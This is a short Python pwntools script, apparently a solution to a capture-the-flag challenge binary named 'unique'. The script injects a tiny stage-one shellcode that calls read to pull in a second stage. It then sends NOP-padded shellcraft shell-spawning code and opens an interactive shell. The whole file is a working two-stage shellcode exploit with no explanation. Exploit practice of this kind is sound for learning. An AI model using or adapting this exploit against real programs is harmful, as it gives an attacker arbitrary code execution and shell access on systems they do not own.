from pwn import *

exe = ELF('./unique')

r = process([exe.path])
#gdb.attach(r, gdbscript='b *main+98')

context.binary = exe

asm(shellcraft.sh())

code = '''
xchg rdx, rsi
mov edx, 0xaa
xor edi, edi
syscall
'''

sc = asm(code)
print(len(sc))
print(disasm(sc))
r.sendline(sc)
sleep(1)
r.sendline(b'\x90'*len(sc) + asm(shellcraft.sh()))


r.interactive()
